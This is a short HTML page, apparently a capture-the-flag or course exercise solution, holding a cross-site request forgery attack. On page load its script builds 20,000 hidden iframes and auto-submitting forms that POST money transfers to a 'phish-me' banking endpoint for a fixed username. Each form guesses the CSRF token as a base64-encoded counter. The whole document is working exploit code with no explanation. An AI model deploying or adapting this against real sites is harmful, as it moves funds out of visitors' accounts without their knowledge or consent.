<!DOCTYPE html>
<html>
<body>
<script>
const myUsername = "z5609537";
const amount = "100";

for (let i = 1; i <= 20000; i++) {
    const token = btoa(i.toString());
    const iframe = document.createElement('iframe');
    iframe.name = 'f' + i;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://phish-me.quoccacorp.com/api/transfer';
    form.target = 'f' + i;

    const u = document.createElement('input');
    u.name = 'username'; u.value = myUsername;
    const a = document.createElement('input');
    a.name = 'amount'; a.value = amount;
    const c = document.createElement('input');
    c.name = 'csrf_token'; c.value = token;

    form.append(u, a, c);
    document.body.appendChild(form);
    form.submit();
}
</script>
</body>
</html>
